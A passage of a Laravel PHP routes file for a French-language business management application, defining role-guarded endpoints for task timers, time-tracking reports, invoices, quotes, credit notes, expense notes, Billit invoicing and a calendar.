    Route::get('/CustomerPointagerepports/preview/{startDate}/{endDate}', [tasksController::class, 'previewCustomerReport'])
        ->where(['startDate' => '\d{4}-\d{2}-\d{2}', 'endDate' => '\d{4}-\d{2}-\d{2}'])
        ->name('CustomerPointagerepports.preview');
    Route::get('/CustomerPointagerepports/previewOneDay/{startDate}', [tasksController::class, 'previewOneDayCustomerReport'])
        ->where(['startDate' => '\d{4}-\d{2}-\d{2}'])
        ->name('CustomerPointagerepports.previewOneDay');
    Route::get('/CustomerPointagerepports/pdf', [tasksController::class, 'streamCustomerReportPdf'])
        ->name('CustomerPointagerepports.pdf');
    Route::post('/CustomerPointagerepports/send', [tasksController::class, 'sendCustomerReport'])->name('CustomerPointagerepports.send');

    // Employees daily totals PDF
    Route::get('/Pointagerepports/employees-daily-totals/{startDate}/{endDate}', [tasksController::class, 'employeesDailyTotals'])
        ->where(['startDate' => '\\d{4}-\\d{2}-\\d{2}', 'endDate' => '\\d{4}-\\d{2}-\\d{2}'])
        ->name('Pointagerepports.employeesDailyTotals');

    Route::post('/employees/send-email', [employeesController::class, 'sendEmail'])->name('employees.send-email');

    Route::get('/devis/get-contacts/{devisId}', [projectController::class, 'getDevisContacts'])->name('devis.getContacts');

    Route::get('/billit-test', [BillitController::class, 'test'])->name('billit.test');

    // Billit test page and send endpoint (admin scoped)
    Route::get('/billit-test', [BillitController::class, 'test'])->name('billit.test');
    Route::post('/billit/send-invoice/{id}', [BillitController::class, 'sendInvoiceHistoryBillit'])->name('billit.send-invoice');
    Route::post('/billit/send-invoice/{id}/{type}', [BillitController::class, 'sendInvoiceHistoryBillitByType'])->name('billit.send-invoice-type');
    Route::get('/billit/invoices/{type}', [BillitController::class, 'listInvoicesByType'])->name('billit.invoices-by-type');

     Route::delete('/tasks/timer/{id}', [tasksController::class, 'destroyTimer'])->name('tasks.timer.destroy');
});






Route::middleware('auth')->group(function () {
    Route::post('/alerts/{alert}/read', [AlertController::class, 'markAsRead'])->name('alerts.read');
    Route::delete('/alerts/{alert}', [AlertController::class, 'destroy'])->name('alerts.destroy');
    Route::get('/search', [SearchController::class, 'search'])->name('search');
});

Route::middleware(['auth', 'verified', 'role:Responsable de projet'])->name('Responsable_de_projet.')->prefix('Responsable_de_projet')->group(function () {
    Route::get("/", [EmployeesIndexController::class, "index"])->name("index");

    Route::post('/tasks/{tasks}/{employee_id}/start', [tasksController::class, "start"])->name('tasks.start-thread');
    Route::post('/tasks/{tasks}/{employee_id}/stop', [tasksController::class, "stop"])->name('tasks.stop-thread');
    Route::post('/tasks/{tasks}/{employee_id}/pause', [tasksController::class, 'pause'])->name('tasks.pause-thread');
    Route::post('/tasks/{tasks}/{employee_id}/resume', [tasksController::class, 'resume'])->name('tasks.resume-thread');
    
    // Calendar routes for Responsable de projet
    Route::get('/calendar', [CalendarController::class, 'index'])->name('calendar.index');
    Route::get('/calendar/events', [CalendarController::class, 'getEvents'])->name('calendar.events');
    Route::get('/calendar/daily-events', [CalendarController::class, 'getDailyEvents'])->name('calendar.dailyEvents');
    Route::get('/calendar/events/current-month', [CalendarController::class, 'getCurrentMonthEvents'])->name('calendar.currentMonthEvents');

    Route::get('/billit-test', [BillitController::class, 'test'])->name('billit.test');
    Route::post('/billit/send-invoice/{id}', [BillitController::class, 'sendInvoiceHistoryBillit'])->name('billit.send-invoice');
    Route::post('/billit/send-invoice/{id}/{type}', [BillitController::class, 'sendInvoiceHistoryBillitByType'])->name('billit.send-invoice-type');
    Route::get('/billit/invoices/{type}', [BillitController::class, 'listInvoicesByType'])->name('billit.invoices-by-type');

     Route::delete('/tasks/timer/{id}', [tasksController::class, 'destroyTimer'])->name('tasks.timer.destroy');

    Route::get('tasks/tasks-info/{startDate}/{employee_id}', [EmployeestasksController::class, 'getTasksInfo'])->name('tasks.info-employee');
    Route::get('tasks/tasks-info-interval/{startDate}/{endDate}/{employee_id}', [EmployeestasksController::class, 'getTasksInfoInterval'])->name('tasks.info-interval');
    Route::get('tasks/get-project-name/{taskName}', [TasksController::class, 'getProjectName']);
    Route::get('tasks/get-employee-name/{employeeId}', [TasksController::class, 'getEmployeeName']);

    Route::resource('/tasks', EmployeestasksController::class)->except(['show', 'create', 'store']);
    Route::post('/tasks/{task}/status/{status}', [EmployeestasksController::class, "status"])->name('tasks.status');
    Route::get('/tasks/pointage', [EmployeestasksController::class, 'pointage'])->name('tasks.pointage');

    Route::resource('/teams', EmployeesteamsController::class);

    Route::get('/todoliste/create', [todolisteController::class, 'create'])->name('todoliste.create');
    Route::post('/todoliste/store', [todolisteController::class, 'store'])->name('todoliste.store');
    Route::delete('/todoliste/destroy', [todolisteController::class, 'destroy'])->name('todoliste.destroy');

    Route::get('tasks/tasks-info-interval-employee/{startDate}/{endDate}/{employee}', [TasksController::class, 'getTasksInfoIntervalEmployee'])->name('tasks.interval-info-employee');

    Route::post('/tasks/update-duration/{task}', [TasksController::class, "updateDuration"])->name('tasks.updateDuration-task');

    Route::get('/Pointagerepports/downloadRepports/{startDate}/{endDate}/{employeeID}', [EmployeestasksController::class, 'downloadPointageRepports'])->name('Pointagerepports.downloadRepports-employee');
    Route::get('/Pointagerepports/downloadOneDayRepports/{startDate}/{employeeID}', [EmployeestasksController::class, 'downloadOneDayRepports'])->name('Pointagerepports.downloadOneDayRepports-employee');

    Route::get('/tasks/board', [tasksController::class, "board"])->name('tasks.board');
    Route::resource('/tasks', tasksController::class)->except(['create', 'store']);
    Route::post('/tasks/{task}/status/{status}', [tasksController::class, "status"])->name('tasks.status');
    Route::get('/tasks/create/{project_id?}', [tasksController::class, "create"])->name('tasks.create');
    Route::post('/tasks/move-task', [tasksController::class, "moveTask"])->name('tasks.moveTask');
    Route::post('/tasks/store/{project_id}', [tasksController::class, "store"])->name('tasks.store');
    Route::get('/Tasksrepports/downloadRepports', [tasksController::class, 'downloadTasksRepports'])->name('Tasksrepports.downloadRepports');

    Route::post('workdaysrepports/updateWorkdaysRepport', [employeesController::class, 'updateWorkdaysRepport'])->name('workdaysrepports.updateWorkdaysRepport');
    Route::get('/workDaysReports/index', [employeesController::class, "workDaysReportsIndex"])->name('workDaysReports.index');
    Route::get('/workDaysReports/filter-reports', [employeesController::class, 'filterReports'])->name('workDaysReports.filterReports');
    Route::get('/workDaysReports/downloadRepports', [employeesController::class, 'downloadworkDaysRepports'])->name('workDaysReports.downloadRepports');
    Route::post('/workDaysReports/nextMonthRepports', [employeesController::class, 'nextMonthRepports'])->name('workDaysReports.nextMonthRepports');


    Route::resource('/roles', RoleController::class)->except(['create', 'store'])->where(['role' => '[0-9]+']);
    Route::post('/roles/{role}/assign_permission', [RoleController::class, "assign_permission"])->name("roles.assign_permission");
    Route::post('admin/roles/{role}/delete_permission', [RoleController::class, "delete_permission"])->name('roles.delete_permission');
    Route::resource('/permissions', PermissionController::class);
    Route::resource('/employees', employeesController::class)->except(['destroy']);
    Route::delete('/employees/{employee}/destroy', [employeesController::class, "destroy"])->name('employees.destroy');
    Route::post('/employees/{employee}/assign_roles', [employeesController::class, "assign_roles"])->name("employees.assign_roles");
    Route::post('/employee/{employee}/desactivate', [employeesController::class, "desactivate"])->name("employee.deactivate");
    Route::post('/employee/{employee}/activate', [employeesController::class, "activate"])->name("employee.activate");
    Route::resource('/clients', clientsController::class);
    Route::delete('/clients/{client}/destroy', [clientsController::class, "destroy"])->name('client.destroy');

    Route::put('/clients/{client}/addContact', [clientsController::class, 'addContact'])->name('clients.addContact');

    Route::resource('/tasks', tasksController::class)->except(['create', 'store']);
    Route::post('/tasks/{task}/status/{status}', [tasksController::class, "status"])->name('tasks.status');
    Route::get('/tasks/create/{project_id?}', [tasksController::class, "create"])->name('tasks.create');
    Route::post('/tasks/move-task', [tasksController::class, "moveTask"])->name('tasks.moveTask');
    Route::post('/tasks/store/{project_id}', [tasksController::class, "store"])->name('tasks.store');
    Route::resource('/teams', teamsController::class);
    Route::get('/projects/create/{client_id?}', [projectController::class, "create"])->name('projects.create');
    Route::post('/projects/store/{client_id?}', [projectController::class, "store"])->name('projects.store');
    Route::get('projects/report', [ProjectController::class, 'projectReport'])->name('projects.report');
    Route::resource('/projects', projectController::class)->except(['create', 'store']);
    Route::post('/projects/{project}/status/{status}', [projectController::class, "status"])->name('projects.status');
    Route::post('projects/updateProject', [projectController::class, 'updateProject'])->name('projects.updateProject');

    Route::resource('/todoliste', todolisteController::class)->except(['show', 'update', 'destroy', 'store']);

    //Route::get('/todoliste/create', [todolisteController::class,'create'])->name('todoliste.create');
    //Route::post('/todoliste/store', [todolisteController::class,'store'])->name('todoliste.store');
    //Route::get('/todoliste/edit/{$id}', [todolisteController::class,'edit'])->name('todoliste.edit');
    Route::post('/todoliste/update/{id}', [todolisteController::class, 'update'])->name('todoliste.update');
    Route::delete('/todoliste/destroy', [todolisteController::class, 'destroy'])->name('todoliste.destroy');
    Route::delete('/todoliste/deleteItem/{id}', [todolisteController::class, 'deleteItem'])->name('todoliste.deleteItem');
    Route::post('/todoliste/updatestatus/{todoliste}', [todolisteController::class, 'updateStatus'])->name('todoliste.updateStatus');

    Route::get('/tasks/pointage', [tasksController::class, 'pointage'])->name('tasks.pointage');
    Route::get('tasks/tasks-info/{startDate}', [TasksController::class, 'getTasksInfo'])->name('tasks.info');
    Route::get('tasks/tasks-info-interval/{startDate}/{endDate}', [TasksController::class, 'getTasksInfoInterval'])->name('tasks.interval-info');
    Route::get('tasks/get-project-name/{taskName}', [TasksController::class, 'getProjectName']);
    Route::get('tasks/get-employee-name/{employeeId}', [TasksController::class, 'getEmployeeName']);

    Route::post('/tasks/{task}/start/{employee_id}', [tasksController::class, 'start'])->name('employee.tasks.start');
    Route::post('/tasks/{task}/stop/{employee_id}', [tasksController::class, 'stop'])->name('employee.tasks.stop');

    Route::post('/tasks/{task}/pause/{employee_id}', [tasksController::class, 'pause'])->name('employees.tasks.pause');
    Route::post('/tasks/{task}/resume/{employee_id}', [tasksController::class, 'resume'])->name('employees.tasks.resume');

    Route::resource('/Enterprise_infos', AdminEntrepriseController::class)->except(['show']);
    Route::post('Enterprise_Billings/updateBillings', [AdminEntrepriseController::class, "updateBillings"])->name('Enterprise_Billings.updateBillings');
    Route::post('Enterprise_infos/updateInfos', [AdminEntrepriseController::class, "updateInfos"])->name('Enterprise_infos.updateInfos');
    Route::post('Enterprise_SMTPinfos/updateSMTPInfos', [AdminEntrepriseController::class, "updateSMTPInfos"])->name('Enterprise_SMTPinfos.updateSMTPInfos');
    Route::post('entreprise/validate/{chargeid}/{budget_id}', [AdminEntrepriseController::class, 'validateBilling'])->name('entreprise.validateBilling');
    Route::post('entreprise/unvalidate/{chargeid}/{budget_id}', [AdminEntrepriseController::class, 'unvalidateBilling'])->name('entreprise.unvalidateBilling');
    Route::post('entreprise/addBudget', [AdminEntrepriseController::class, 'addBudget'])->name('entreprise.addBudget');
    Route::get('/entrepriseBillings/downloadRepports', [AdminEntrepriseController::class, 'downloadBillingsRepports'])->name('entrepriseBillings.downloadRepports');


    Route::post('clients/updateClient', [clientsController::class, 'updateClient'])->name('clients.updateClient');
    Route::post('clients/updateContact', [clientsController::class, 'updateContact'])->name('clients.updateContact');

    Route::post('employees/updateEmployee', [employeesController::class, 'updateEmployee'])->name('employees.updateEmployee');

    Route::get('/projects/invoice/{id}', [ProjectController::class, 'invoice'])->name('projects.invoice');
    Route::get('/projects/invoicebyduration/{name}/{duration}/{cost}', [projectController::class, "invoicebyduration"])->name('projects.invoicebyduration');
    Route::get('/invoices/fullinvoice', [projectController::class, "fullinvoice"])->name('invoices.fullinvoice');
    Route::get('/projects/invoicebyduration2/{id}/{startdate}/{enddate}', [projectController::class, "invoicebyduration2"])->name('projects.invoicebyduration2');

    Route::get('/invoices/invoicehistory', [projectController::class, "invoicehistory"])->name('invoices.invoicehistory');
    Route::delete('/invoice/{invoice}/destroy', [projectController::class, "destroyInvoice"])->name('invoice.destroy');

    Route::post('/invoice/{invoice}/desactivate', [projectController::class, "desactivate"])->name("invoice.deactivate");
    Route::post('/invoice/{invoice}/activate', [projectController::class, "activate"])->name("invoice.activate");

    Route::get('/invoice/downloadPartial/{invoiceNumber}', [projectController::class, "downloadPeriodInvoice"])->name("invoice.downloadPartial");
    Route::get('/invoice/downloadFull/{invoiceNumber}', [projectController::class, "downloadFullInvoice"])->name("invoice.downloadFull");

    Route::post('/invoice/remind', [projectController::class, "sendemailreminder"])->name('invoice.remind');

    Route::get('/invoice/Manualremind/{id}/{reminder}', [projectController::class, "sendManualReminder"])->name('invoice.sendManualremind');

    Route::post('/invoice/SendInvReminder/{invoice_id}/{reminder_number}', [projectController::class, "SendInvReminder"])->name('invoice.SendInvReminder');

    Route::get('/get-contacts/{clientId}', [projectController::class, "getContacts"]);
    Route::post('/send-invoice/{invoice_id}', [projectController::class, 'sendInvoice'])->name('invoice.sendInvoice');

    Route::get('/devis/generateDevis', [projectController::class, "generateDevis"])->name('devis.generateDevis');
    Route::post('/devis/sendDevis', [projectController::class, "sendDevis"])->name('devis.sendDevis');
    Route::post('/devis/saveDevisPdf', [projectController::class, "saveDevisPdf"])->name('devis.saveDevisPdf');

    Route::get('/devis/devishistory', [projectController::class, "devishistory"])->name('devis.devishistory');
    Route::delete('/devis/{devis}/destroy', [projectController::class, "destroydevis"])->name('devis.destroy');
    Route::get('/devis/downloadDevis/{id}', [projectController::class, "downloadDevis"])->name("devis.downloadDevis");

    Route::post('/devis/{devis}/acceptDevis', [projectController::class, "acceptDevis"])->name("devis.acceptDevis");
    Route::post('/devis/{devis}/declineDevis', [projectController::class, "declineDevis"])->name("devis.declineDevis");

    Route::get('/pointage/index', [tasksController::class, 'Markpointage'])->name('pointage.index');

    Route::post('/pointage/{tasks}/{employee_id}/start', [tasksController::class, "start"])->name('tasks.start');
    Route::post('/pointage/{tasks}/{employee_id}/stop', [tasksController::class, "stop"])->name('tasks.stop');
    Route::post('/pointage/{tasks}/{employee_id}/pause', [tasksController::class, 'pause'])->name('tasks.pause');
    Route::post('/pointage/{tasks}/{employee_id}/resume', [tasksController::class, 'resume'])->name('tasks.resume');

    Route::get('/invoices/pdf/{invoiceName}', [projectController::class, "servePdf"])->name('invoices.servePdf');

    Route::get('/invoices/parameters', [projectController::class, "parameters"])->name('invoices.parameters');
    Route::get('/devis/parameters', [projectController::class, "devisparameters"])->name('devis.parameters');

    Route::post('pointage/fetch-duration', [tasksController::class, 'fetchDuration'])->name('fetch.duration');

    Route::post('/tasks/update-duration/{task_id}', [tasksController::class, "updateDuration"])->name('tasks.updateDuration');

    Route::post('/entreprise/updateImage', [AdminEntrepriseController::class, "updateImage"])->name('entreprise.updateImage');

    Route::delete('/clients/destroyContact/{contact_id}', [clientsController::class, "destroyContact"])->name('clients.destroyContact');

    Route::get('/Clientrepports/downloadRepports', [clientsController::class, 'downloadClinetsRepports'])->name('Clientrepports.downloadRepports');
    Route::get('/Employeesrepports/downloadRepports', [employeesController::class, 'downloadEmployeesRepports'])->name('Employeesrepports.downloadRepports');
    Route::get('/Projectsrepports/downloadRepports', [projectController::class, 'downloadProjectsRepports'])->name('Projectsrepports.downloadRepports');
    Route::get('/Tasksrepports/downloadRepports', [tasksController::class, 'downloadTasksRepports'])->name('Tasksrepports.downloadRepports');

    Route::get('/Pointagerepports/downloadRepports/{startDate}/{endDate}', [tasksController::class, 'downloadPointageRepports'])->name('Pointagerepports.downloadRepports');
    Route::get('/Pointagerepports/downloadOneDayRepports/{startDate}', [tasksController::class, 'downloadOneDayRepports'])->name('Pointagerepports.downloadOneDayRepports');

    Route::get('/CustomerPointagerepports/CustomerdownloadRepports/{startDate}/{endDate}', [tasksController::class, 'CustomerdownloadPointageRepports'])->name('CustomerPointagerepports.CustomerdownloadRepports');
    Route::get('/CustomerPointagerepports/CustomerdownloadOneDayRepports/{startDate}', [tasksController::class, 'CustomerdownloadOneDayRepports'])->name('Pointagerepports.CustomerdownloadOneDayRepports');

    Route::get('/Teamssrepports/downloadRepports', [teamsController::class, 'downloadTeamsRepports'])->name('Teamssrepports.downloadRepports');

    Route::get('/Invoicessrepports/downloadRepports', [projectController::class, 'downloadInvoicesRepports'])->name('Invoicessrepports.downloadRepports');

    Route::get('/Devissrepports/downloadRepports', [projectController::class, 'downloadDevisRepports'])->name('Devissrepports.downloadRepports');

    Route::get('/invoice/creditNote/{id}', [projectController::class, "generateCreditNote"])->name('invoice.creditNote');

    Route::get('/invoice/creditNoteHistory', [projectController::class, "creditNoteHistory"])->name('invoice.creditNoteHistory');

    Route::get('/invoices/serveCreditNotePdf/{credit_note_number}', [projectController::class, "serveCreditNotePdf"])->name('invoices.serveCreditNotePdf');

    Route::get('/creditNote/downloadRepports', [projectController::class, 'downloadcreditNoteRepports'])->name('creditNote.downloadRepports');

    Route::delete('/credit_note/{credit_note}/destroy', [projectController::class, "destroyCreditNote"])->name('credit_note.destroy');

    Route::get('/creditNote/creditNoteHistory', [projectController::class, "creditNoteHistory"])->name('creditNote.creditNoteHistory');

    // Detailed Credit Note Routes
    Route::get('/invoice/detailedCreditNote/{id}', [projectController::class, "createDetailedCreditNote"])->name('invoice.detailedCreditNote');
    Route::post('/invoices/confirmDetailedCreditNote/{invoiceID}', [projectController::class, "confirmDetailedCreditNote"])->name('invoices.confirmDetailedCreditNote');

    Route::post('workdaysrepports/updateWorkdaysRepport', [employeesController::class, 'updateWorkdaysRepport'])->name('workdaysrepports.updateWorkdaysRepport');

    Route::get('/workDaysReports/index', [employeesController::class, "workDaysReportsIndex"])->name('workDaysReports.index');

    Route::get('/workDaysReports/filter-reports', [employeesController::class, 'filterReports'])->name('workDaysReports.filterReports');

    Route::get('/workDaysReports/downloadRepports', [employeesController::class, 'downloadworkDaysRepports'])->name('workDaysReports.downloadRepports');

    Route::post('/workDaysReports/nextMonthRepports', [employeesController::class, 'nextMonthRepports'])->name('workDaysReports.nextMonthRepports');

    // New routes for PDF preview and emailing
    Route::get('/workDaysReports/pdf', [employeesController::class, 'generatePdfForPreview'])->name('workDaysReports.pdf');
    Route::post('/workDaysReports/sendEmail', [employeesController::class, 'sendWorkdaysReportEmail'])->name('workDaysReports.sendEmail');

    Route::get('/notedefrais/generateNoteDeFrais', [projectController::class, "generateNoteDeFrais"])->name('notedefrais.generateNoteDeFrais');
    Route::post('/notedefrais/savePdf', [projectController::class, "saveNoteDeFraisPdf"])->name('notedefrais.saveNoteDeFraisPdf');
    Route::get('/notedefrais/parameters', [projectController::class, "notedefraisparameters"])->name('notedefrais.parameters');
    Route::get('/notedefrais/downloadNoteDeFrais/{id}', [projectController::class, "downloadNoteDeFrais"])->name("notedefrais.downloadNoteDeFrais");
    Route::get('/notedefrais/notedefraishistory', [projectController::class, "notedefraishistory"])->name('notedefrais.notedefraishistory');
    Route::delete('/notedefrais/{notedefrais}/destroy', [projectController::class, "destroyNotedeFrais"])->name('notedefrais.destroy');
    Route::get('/notedefrais/downloadRepports', [projectController::class, 'downloadNoteDeFraisRepports'])->name('notedefrais.downloadRepports');

    Route::get('filter/employees/{employeeId}/projects', [ProjectController::class, 'getEmployeeProjects'])->name('filter.getEmployeeProjects');
    Route::get('filter/employees/{employeeId}/tasks', [ProjectController::class, 'getEmployeeTasks'])->name('filter.getEmployeeTasks');
    Route::get('filter/projects/{projectId}/tasks', [ProjectController::class, 'getProjectTasks'])->name('filter.getProjectTasks');
    Route::get('filter/tasks/{taskId}', [ProjectController::class, 'getTaskInfo'])->name('filter.getTaskInfo');
    Route::get('filter/projects', [ProjectController::class, 'getAllProjects'])->name('filter.getAllProjects');
    Route::get('filter/tasks', [ProjectController::class, 'getAllTasks'])->name('filter.getAllTasks');

    Route::get('/projects/partialInvoice/{projectid}/{amount}', [projectController::class, "PartialInvoice"])->name('projects.PartialInvoice');
    Route::get('/projects/percentageInvoice/{projectid}/{percentage}', [projectController::class, "PercentageInvoice"])->name('projects.PercentageInvoice');

    Route::post('/projects/confirm-full-invoice/{projectID}/{budget}/{comment?}', [ProjectController::class, 'confirmFullInvoice'])->name('projects.confirmFullInvoice');

    Route::post('/projects/confirm-period-invoice/{projectID}/{startdate}/{enddate}/{comment?}', [ProjectController::class, 'confirmPeriodInvoice'])->name('projects.confirmPeriodInvoice');
    Route::post('/projects/confirm-percentage-invoice/{projectID}/{percentage}/{comment?}', [ProjectController::class, 'confirmPercentageInvoice'])->name('projects.confirmPercentageInvoice');
    Route::post('/projects/confirm-partial-invoice/{projectID}/{amount}/{comment?}', [ProjectController::class, 'confirmPartialInvoice'])->name('projects.confirmPartialInvoice');

    Route::post('/projects/decline-Invoice', [ProjectController::class, 'declineInvoice'])->name('projects.declineInvoice');

    Route::post('/projects/archive/{project_id}', [ProjectController::class, "archiveProject"])->name('projects.archive');
    Route::post('/projects/unarchive/{project_id}', [ProjectController::class, "unarchiveProject"])->name('projects.unarchive');
    Route::get('projectsArchived/archive', [ProjectController::class, 'projectArchiveIndex'])->name('projectsArchived.archiveIndex');

    Route::post('/devis/archive/{devis_id}', [ProjectController::class, "archiveDevis"])->name('devis.archive');
    Route::post('/devis/unarchive/{devis_id}', [ProjectController::class, "unarchiveDevis"])->name('devis.unarchive');
    Route::get('devisArchived/archive', [ProjectController::class, 'devisArchiveIndex'])->name('devisArchived.archiveIndex');

    Route::post('creditNote/confirm/{id}/{noteType}/{noteAmount}', [ProjectController::class, 'ConfirmCreditNote'])->name('creditNote.confirm');

    Route::post('/confirm-frais-note', [ProjectController::class, 'confirmFraisNote'])->name('notedefrais.confirmFraisNote');

    Route::post('/projects/updateInfos/{id}/{client_id?}', [ProjectController::class, 'update'])->name('projects.updateInfos');

    Route::get('/tasks/{employee}/durationInfos/{task}', [tasksController::class, 'durationInfos'])->name('tasks.durationInfos');

    Route::post('/devis/saveDuplicateDevis', [projectController::class, "saveDuplicateDevis"])->name('devis.saveDuplicateDevis');
    Route::get('/devis/duplicateDevis/{devis_id}', [projectController::class, "duplicateDevis"])->name('devis.duplicateDevis');

    Route::get('/pointage/filterPointageByDate', [tasksController::class, 'filterPointageByDate'])->name('pointage.filterPointageByDate');

    Route::get('/pointage/get-timer-state', [tasksController::class, 'get_timer_state'])->name('pointage.get_timer_state');

    Route::get('/pointage/filter-table', [tasksController::class, 'filterPointageTable'])->name('pointage.filterPointageTable');

    Route::get('invoiceArchived/archive', [ProjectController::class, 'invoiceArchiveIndex'])->name('invoiceArchived.archiveIndex');

    Route::delete('/billing/destroy/{id}', [AdminEntrepriseController::class, 'destroyBillings'])->name('billing.destroy');
    Route::post('/budget/update/{id}', [AdminEntrepriseController::class, 'updateCharge'])->name('budget.updateCharge');


    Route::get('/calendar', [CalendarController::class, 'index'])->name('calendar.index');
    Route::get('/calendar/events', [CalendarController::class, 'getEvents'])->name('calendar.events');
    Route::post('/calendar/events', [CalendarController::class, 'store'])->name('calendar.store');
    Route::put('/calendar/events/{id}', [CalendarController::class, 'update'])->name('calendar.update');
    Route::delete('/calendar/events/{id}', [CalendarController::class, 'destroy'])->name('calendar.destroy');
    Route::patch('/calendar/events/{id}/dates', [CalendarController::class, 'updateDates'])->name('calendar.updateDates');

    Route::get('/calendar/daily-events', [CalendarController::class, 'getDailyEvents'])->name('calendar.dailyEvents');
    Route::get('/calendar/events/current-month', [CalendarController::class, 'getCurrentMonthEvents'])->name('calendar.currentMonthEvents');
    Route::get('/calendar/send-events/preview', [CalendarController::class, 'previewSendEvents'])->name('calendar.send-events.preview');
    Route::get('/calendar/events/pdf', [CalendarController::class, 'generateEventsPDF'])->name('calendar.events.pdf');
    Route::post('/calendar/send-events-email', [CalendarController::class, 'sendEventsEmail'])->name('calendar.send-events-email');

    // Edit Full Invoice routes
    Route::get('/invoices/edit/{id}', [ProjectController::class, 'editFullInvoice'])->name('invoices.editFullInvoice');
    Route::put('/invoices/update/{id}', [ProjectController::class, 'updateFullInvoice'])->name('invoices.updateFullInvoice');

    // Edit Partial Invoice routes
    Route::get('/invoices/partial/edit/{id}', [ProjectController::class, 'editPartialInvoice'])->name('invoices.editPartialInvoice');
    Route::put('/invoices/partial/update/{id}', [ProjectController::class, 'updatePartialInvoice'])->name('invoices.updatePartialInvoice');

    // Edit Percentage Invoice routes
    Route::get('/invoices/percentage/edit/{id}', [ProjectController::class, 'editPercentageInvoice'])->name('invoices.editPercentageInvoice');
    Route::put('/invoices/percentage/update/{id}', [ProjectController::class, 'updatePercentageInvoice'])->name('invoices.updatePercentageInvoice');

    // Edit Period Invoice routes
    Route::get('/invoices/period/edit/{id}', [ProjectController::class, 'editPeriodInvoice'])->name('invoices.editPeriodInvoice');
    Route::put('/invoices/period/update/{id}', [ProjectController::class, 'updatePeriodInvoice'])->name('invoices.updatePeriodInvoice');

    Route::get('/devis/edit/{id}', [projectController::class, 'editDevis'])->name('devis.editDevis');
    Route::put('/devis/update/{id}', [projectController::class, 'updateDevis'])->name('devis.updateDevis');

    Route::post('/projects/{project}/upload-file', [ProjectController::class, 'uploadProjectFile'])->name('projects.uploadFile');
    Route::get('/projects/downloadfiles/{file_name}', [ProjectController::class, 'downloadfiles'])->name('projects.downloadfiles');
    Route::delete('/projects/deletefiles/{file_name}', [ProjectController::class, 'deletefiles'])->name('projects.deletefiles');

    Route::post('/tasks/update-{field}/{id}', [tasksController::class, 'updateField'])->name('tasks.updateField');
    Route::get('/invoices/generate-detailed', [projectController::class, 'generateDetailedInvoice'])->name('invoices.generate.Detailed');
    Route::post('/invoices/detailed', [projectController::class, 'detailedInvoice'])->name('invoices.detailed');
    Route::post('/invoices/confirmDetailedInvoice/{projectID}', [projectController::class, 'confirmDetailedInvoice'])->name('invoices.confirmDetailedInvoice');

    Route::post('/employees/archive/{employee_id}', [employeesController::class, "archiveEmployee"])->name('employees.archive');
    Route::post('/employees/unarchive/{employee_id}', [employeesController::class, "unarchiveEmployee"])->name('employees.unarchive');
    Route::get('employeesArchived/archive', [employeesController::class, 'employeeArchiveIndex'])->name('employeesArchived.archiveIndex');

    Route::get('/invoices/editDetailedInvoice/{id}', [ProjectController::class, 'editDetailedInvoice'])->name('invoices.editDetailedInvoice');
    Route::post('/invoices/updateDetailedInvoice/{id}', [ProjectController::class, 'updateDetailedInvoice'])->name('invoices.updateDetailedInvoice');

    // Add this route within your admin group/middleware
    Route::get('/get-devis/{projectId}', [ProjectController::class, 'getDevisByProject'])->name('get.devis.by.project');
    Route::get('/get-devis-comment/{devisId}', [ProjectController::class, 'getDevisComment']);

    Route::get('/tasks/get-project-tasks/{project}', [TasksController::class, 'getProjectTasks']);
    Route::post('/tasks/move-duration', [TasksController::class, 'moveDuration']);
    Route::get('/employees/{employeeId}/projects', [TasksController::class, 'getEmployeeProjects']);
    Route::post('/clients/filterInvoices/{client}', [clientsController::class, 'filterInvoices'])->name('clients.filterInvoices');

    Route::get('/clients/downloadInvoicesRepports/{client}', [clientsController::class, 'downloadInvoicesRepports'])->name('clients.downloadInvoicesRepports');

    Route::get('/filter/all-projects', [TasksController::class, 'getAllProjects']);
    Route::get('/filter/all-tasks', [TasksController::class, 'getAllTasks']);

    Route::get('/filter-invoices', [adminController::class, 'filterInvoices'])->name('filter.invoices');

    Route::post('/credit_note/send/{credit_note_id}', [ProjectController::class, 'sendCreditNote'])->name('credit_note.send');

    Route::get('/filter/clients/{client}/projects', [tasksController::class, 'getClientProjects'])->name('filter.client.projects');

    Route::get('/invoice/{invoice}/recipients', [ProjectController::class, 'getRecipients']);

    Route::get('/Pointagerepports/downloadMultipleTasksRepports/{startDate}/{endDate}', [tasksController::class, 'downloadMultipleTasksRepports'])->name('Pointagerepports.downloadMultipleTasksRepports');

    // Customer Report Routes
    Route::get('/CustomerPointagerepports/preview/{startDate}/{endDate}', [tasksController::class, 'previewCustomerReport'])
        ->where(['startDate' => '\d{4}-\d{2}-\d{2}', 'endDate' => '\d{4}-\d{2}-\d{2}'])
        ->name('CustomerPointagerepports.preview');
    Route::get('/CustomerPointagerepports/previewOneDay/{startDate}', [tasksController::class, 'previewOneDayCustomerReport'])
        ->where(['startDate' => '\d{4}-\d{2}-\d{2}'])
        ->name('CustomerPointagerepports.previewOneDay');
    Route::get('/CustomerPointagerepports/pdf', [tasksController::class, 'streamCustomerReportPdf'])
        ->name('CustomerPointagerepports.pdf');
    Route::post('/CustomerPointagerepports/send', [tasksController::class, 'sendCustomerReport'])->name('CustomerPointagerepports.send');

    Route::post('/employees/send-email', [employeesController::class, 'sendEmail'])->name('employees.send-email');

    Route::get('/devis/get-contacts/{devisId}', [projectController::class, 'getDevisContacts'])->name('devis.getContacts');

        // Update comment on a task timer (owned by the authenticated employee)
        Route::patch('tasks/timers/{id}/comment', [\App\Http\Controllers\employees\tasksController::class, 'updateTimerComment'])->name('tasks.timers.updateComment');

});






Route::middleware(['auth', 'verified', 'role:Employee'])->name('employee.')->prefix('employee')->group(function () {
    Route::get("/", [EmployeesIndexController::class, "index"])->name("index");

    Route::post('/tasks/{tasks}/{employee_id}/start', [tasksController::class, "start"])->name('tasks.start-thread');
    Route::post('/tasks/{tasks}/{employee_id}/stop', [tasksController::class, "stop"])->name('tasks.stop-thread');
    Route::post('/tasks/{tasks}/{employee_id}/pause', [tasksController::class, 'pause'])->name('tasks.pause-thread');
    Route::post('/tasks/{tasks}/{employee_id}/resume', [tasksController::class, 'resume'])->name('tasks.resume-thread');
    
    // Calendar routes for employees
    Route::get('/calendar', [CalendarController::class, 'index'])->name('calendar.index');
    Route::get('/calendar/events', [CalendarController::class, 'getEvents'])->name('calendar.events');
    Route::get('/calendar/daily-events', [CalendarController::class, 'getDailyEvents'])->name('calendar.dailyEvents');
    Route::get('/calendar/events/current-month', [CalendarController::class, 'getCurrentMonthEvents'])->name('calendar.currentMonthEvents');

